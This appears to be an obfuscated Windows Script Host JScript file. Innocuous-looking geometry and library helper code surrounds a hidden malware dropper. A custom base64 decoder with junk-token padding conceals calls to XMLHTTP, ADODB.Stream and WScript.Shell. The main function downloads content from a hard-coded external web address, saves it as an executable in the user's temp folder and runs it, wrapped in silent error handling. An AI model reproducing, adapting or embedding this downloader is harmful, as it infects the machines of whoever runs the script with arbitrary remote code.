
var neutralize = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  tulip = [];
	
var manatarms = { ':': '.','U': 'S','381': 'X'};
	var augury = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function jovial(improved) {
	repentant = improved;
	for (var i in manatarms){repentant = repentant.replace(i, manatarms[i]);}
    return repentant;
};

var forthright = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.jovial4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/canal/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = neutralize[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = neutralize[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = neutralize[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = neutralize[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var astronomy ="canalJVcanalRFTVcanalAl".jovial4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var gotta = "canalQWcanalN0aXZcanallWE9iacanalmVjdA=canal=".jovial4();
String.prototype.jovial2 = function () {
    var appearance = {
        uncut: this
    };
    appearance.warbler = appearance.uncut["c3Vic3RyaW5n".jovial4()](augury, forthright);
    return appearance.warbler;
};

var hypothetical ="canalRXhwYW5canalkRW52aXcanalJvbm1lbnRTdHJcanalpbmdz".jovial4();
var Native = function(options){
	
};
var selections = [gotta, hypothetical,astronomy,  ""+"."+("russet","choices","train","friesland","vernacular","field","tight","internationally","exe"), "UnVu".jovial4(), jovial("M"+"SX"+"ML"+("uneven","holidays","riverside","planetary","elixir","essentially","supported","2.")+"381M"+"LH"+"TT"+("morgan","coldest","emanate","contact","abdicated","imprudent","instructions","likewise","P>")+"WU"+("awfulness","protein","scholarship","flush","chime","informal","voicing","cr")+("steaming","trooper","personification","brawn","reconsider","hundredth","javascript","kerry","ip")+"t:"+("saints","decade","snorting","deviation","appliance","instruction","scrawl","fujitsu","Sh")+"ell")];
debug = "_F2_";
var defender = this[selections.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
DaWocro = "KfSJetG";
undesirable = (("barbados", "nepal", "proceedings", "chirp", "using", "welling", "rowdy", "ptIFpHfcTNo") + "JvpxKdHKm").jovial2();
downtown = (("baseball", "expiate", "reforms", "concentration", "regulatory", "penetration", "crash", "nocturnal", "alkali", "svBpoEqpcXoz") + "ToIcsDyW").jovial2();
  
    String.prototype.vertebrate = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var extensive = selections.pop().split(">");

genoese = "b3Blbg==".jovial4();
var british = new defender(extensive[1]);
var brunette = new defender(extensive[0]);
var consolidation = british[selections.shift()](selections.shift());
weasel = "E";

var elicit = selections.shift();
var neither = selections.shift();
function downpour(interdict, fears) {

    try {
        var ending = consolidation + "/" + fears ;
		ending = ending+ elicit;
            brunette[genoese](("autumn","babes","relations","adherent","container","machines","agrarian","comfortable","G" + weasel) + ("holdings","ability","prosecutor","restricted","capacious","increased","footstep","cleaning","darwin","petersburg","T"), interdict, false);
       
    brunette[downtown + ("diagram","matched","end")]();
	var moderator=("undesirable" + WScript=="undesirable" + "V2luZG93cyBTY3JpcHQgSG9zdA==".jovial4())&&brunette["c3RhdHVz".jovial4()] +""=="MjAw".jovial4()&&typeof(zMPDMv)==="undefined";

    if (moderator) {
		
        var governance = new defender((("angeles","seeks","apoplexy","brahma","canes","abounding","muslims","personnel","A")+("earliest","casque","operators","commissions","users","rights","greens","structural","SEOO")+"DB"+("mistook","gaoler","handjob","surplice","quaking","cruising","squeak",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        governance[genoese]();
        iFwHtPXgp = "_F9_";
        governance.type = forthright;
        dNMRPa = "_F10_";
        governance["d3JpdGU=".jovial4()](brunette[("guards","involvement","cloven","signup","chaparral","blame","outreach","")+"R"+"es"+"pon"+manatarms['U'].toLowerCase()+"e"+"Qm9keQ==".jovial4()]);
        mBbOIK = "_F11_";
        governance[(undesirable + "o"+("fissure","centralization","levitra","citron","picket","abatement","optional","horses","00")+("steeple","fluently","appointments","wharves","chronicle","exemplary","irreparable","8i")+"tion").replace("0"+("athlete","pizza","cranium","highland","outlet","middle","intel","08"), downtown)] = 0;
        lpWUOy = "_F12_";
        governance.saveToFile(ending, 2);
        QUHSrRQddp = "_F13_";
        governance.close();
        LrAJkkJLP = "_F14_";
		british[neither](ending, forthright, true);
    }
} catch (kuSzUrwe) { };

    crQqlSfXxhj = "_F15_";
}
try{
downpour("aHRcanal0cDcanalovLw=canal=".jovial4()+"\u0077\u0077\u0077"+"\u002E\u0063\u0069\u0074\u0079\u0074\u006F\u006E\u0069\u0067\u0068\u0074\u002E\u0065\u0073\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?yKmWsDA=LlcIsF","OtwzuXkmk");}catch(boQfllDFhLI){}

   CCNUYgQoh = "_F16_";
   